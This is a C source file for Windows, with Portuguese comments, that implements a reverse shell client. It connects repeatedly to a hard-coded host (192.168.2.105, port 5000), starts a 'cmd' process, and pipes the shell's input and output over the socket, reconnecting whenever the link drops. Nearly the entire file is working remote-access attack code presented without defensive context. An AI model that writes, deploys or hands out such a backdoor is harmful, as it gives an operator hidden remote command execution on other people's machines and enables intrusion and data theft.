/*
 * compile:
 * gcc -o cliente-windows cliente-windows.c -l ws2_32
 *
 * programa abre processo filho 'cmd' e
 * redireciona a saida para o socket
 *
 */


#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif // WIN32_LEAN_AND_MEAN

#include <io.h>
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <string.h>
#include <sys/types.h>
#include <errno.h>
#include <locale.h>
//#pragma comment(lib, "Ws2_32.lib");

#define MAXBUFF 102400
#define DISCONNECTED 2

#define ADDRSV "192.168.2.105"
#define PORT 5000

#define DEBUG 0

HANDLE hPipeInWrite; // escrever no shell
HANDLE hPipeOutRead; // ler no shell

HANDLE hPipeInRead;
HANDLE hPipeOutWrite;

SOCKET hSock;

// prototipos
int startSocket(SOCKET *fdSock);
int conectar();
int startPipes();
int startProcess(char *process);
int startThreads(HANDLE *arrayThread);
void readProcessChild(void);
void writeProcessChild(void);
void erro(char *msg);


int main(void){

    DWORD i;
    HANDLE arrayThread[2];
    DWORD codExitThread;

    while(TRUE)
    {
        printf("\n\n");

        if(!startSocket(&hSock))
            erro("startSocket");

        if(!conectar())
           erro("connect");

        printf("\n[!] Conectado\n");

        send(hSock, "CL", 2, 0);    // identificando a conexao no servidor


        if(!startPipes())
            erro("startPipes");

        if(!startProcess("cmd"))
            erro("startProcess");

        startThreads(arrayThread);

        i = WaitForMultipleObjects(2, arrayThread, FALSE, INFINITE);

        for(int x = 0; x < 2; x++)
        {

           if ((WAIT_OBJECT_0 + i) == i)
                GetExitCodeThread(arrayThread[i], &codExitThread);
                if (codExitThread ==DISCONNECTED)
                    continue;
                else
                    break;
        }

    }

    getchar();
    return 0;
}


void readProcessChild(void)
{

    if (DEBUG)
        puts("[!] Read process");

    char buff[MAXBUFF];
    DWORD bytesRead = 0;

    while (TRUE)
    {

        // le do proecesso child "cmd"
        PeekNamedPipe(hPipeOutRead, buff, MAXBUFF, &bytesRead, NULL, NULL);

        if(bytesRead == 0)
        {
            Sleep(50);
            continue;
        }
        else
        {
            if(!ReadFile(hPipeOutRead, buff, MAXBUFF, &bytesRead, NULL))
                erro("ReadFile");
            if((send(hSock, buff, bytesRead, 0)) == -1)
                ExitThread(DISCONNECTED);
        }
        buff[bytesRead] = '\0';
        fputs(buff, stdout);

    }
    if(DEBUG)
        puts("[!] Thread read saindo...");

    ExitThread(0);

}


void writeProcessChild(void)
{
    if(DEBUG)
        puts("[!] Write process");

    char buff[MAXBUFF] = {0};
    DWORD byteswrite = 0;
    int bytesRead = 0;

    while(TRUE)
    {

        bytesRead = recv(hSock, buff, MAXBUFF, 0);
        if (bytesRead == -1)
            erro("recv");

        else if (bytesRead == 0)    // nada a receber, outra ponta foi desconectada
            ExitThread(DISCONNECTED);

        //else if (bytesRead > 0)
            if(WriteFile(hPipeInWrite, buff, bytesRead, &byteswrite, NULL) <= 0)
                erro("WriteFile");

    }
    if(DEBUG)
        puts("[!] Thread write saindo...");

    ExitThread(0);

}


int startThreads(HANDLE *arrayThread)
{

    if(DEBUG)
        puts("[!] Iniciando threads!");

    HANDLE readThread;
    HANDLE writeThread;
    DWORD threadIdRead;
    DWORD threadIdWrite;

    readThread = CreateThread(NULL,
                              0,
                              (LPTHREAD_START_ROUTINE) readProcessChild,
                              NULL,
                              0,
                              &threadIdRead);

    writeThread = CreateThread(NULL,
                              0,
                              (LPTHREAD_START_ROUTINE) writeProcessChild,
                              NULL,
                              0,
                              &threadIdWrite);

    if(writeThread == NULL || readThread == NULL)
        return FALSE;

    arrayThread[0] = readThread;
    arrayThread[1] = writeThread;

    return TRUE;
}


int startProcess(char *process)
{
    if(DEBUG)
        puts("[!] Iniciando processo");

    PROCESS_INFORMATION procInfo; //estrutura que recebera as informações do processo filho
    STARTUPINFO startInfo; // estrutura com configurações que iniializam o processo
    ZeroMemory(&procInfo, sizeof(PROCESS_INFORMATION));
    ZeroMemory(&startInfo, sizeof(STARTUPINFO));

    startInfo.cb = sizeof(STARTUPINFO);
    startInfo.hStdInput = hPipeInRead;      //entrada padrão
    startInfo.hStdOutput = hPipeOutWrite;   // saida padrão
    startInfo.hStdError = hPipeOutWrite;    // saide de erro padrão
    startInfo.dwFlags |= STARTF_USESTDHANDLES; // habilita opções acima


    BOOL sucess = CreateProcess(NULL,
                                process,    // nome do processo a ser iniciado
                                NULL,
                                NULL,
                                TRUE,
                                0,
                                NULL,
                                NULL,
                                &startInfo,
                                &procInfo);

    if (sucess == 0)
        return FALSE;
    else
    {
        CloseHandle(procInfo.hProcess);
        CloseHandle(procInfo.hThread);
    }

    return TRUE;
}


int startPipes()
{
    if(DEBUG)
        puts("[!] criando pipes");

    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    if(CreatePipe(&hPipeInRead, &hPipeInWrite, &sa, 0) == 0)
        return FALSE;
    // garante que o identificador nao seja herdado pelo processo filgo
    if(!SetHandleInformation(hPipeInWrite, HANDLE_FLAG_INHERIT, 0))
        return FALSE;


    if(CreatePipe(&hPipeOutRead, &hPipeOutWrite, &sa, 0) == 0)
        return FALSE;
    // garante que o identificador nao seja herdado pelo processo filgo
    if(SetHandleInformation(hPipeOutRead, HANDLE_FLAG_INHERIT, 0) == 0)
        return FALSE;

    return TRUE;
}


int conectar()
{
    DWORD codErro;
    int status = FALSE;
    int i = 0;
    const unsigned char progress[3] = {'|', '/', '\\'};

    struct sockaddr_in dadosSv;
    dadosSv.sin_family = AF_INET;
    dadosSv.sin_addr.s_addr = inet_addr(ADDRSV);
    dadosSv.sin_port = htons(PORT);

    while(!status)
    {
        printf("\r[?] Conectando... %c", progress[i]);
        if (i <2 ) i++;
        else i = 0;
        if((connect(hSock, (struct sockaddr *)&dadosSv, sizeof(dadosSv))) == SOCKET_ERROR)
        {
            codErro = GetLastError();
            if (codErro == WSAECONNREFUSED || codErro == WSAENETUNREACH || codErro == WSAETIMEDOUT)
            {
                Sleep(100);
                continue;
            }
            else
            {
                status = FALSE;
                break;
            }
        }

        else
            status = TRUE;
    }

    return status;
}


int startSocket(SOCKET *fdSock){

    WSADATA wsaData;

    if ((WSAStartup(MAKEWORD(2, 2), &wsaData)) != 0)
        return FALSE;

    // flag WSA_FLAG_OVERLAPPED, habilita E/S simultanea no socket
    if ((*fdSock = WSASocket(AF_UNSPEC, SOCK_STREAM, IPPROTO_TCP, NULL, 0, WSA_FLAG_OVERLAPPED)) == INVALID_SOCKET)
        return FALSE;

    return TRUE;
}

void erro(char *msg)
{
    DWORD len;
    DWORD codErro = GetLastError();
    char *msgErro;

    len = FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM |
                  FORMAT_MESSAGE_ALLOCATE_BUFFER |
                  FORMAT_MESSAGE_IGNORE_INSERTS,
                  NULL,
                  codErro,
                  0,
                  (LPSTR) &msgErro,
                  0,
                  NULL);

    msgErro[len] = '\0';
    fprintf(stderr, "Error code: %ld\n", codErro);
    fprintf(stderr, "[x] %s: %s\n", msg, msgErro);
    exit(EXIT_FAILURE);
}

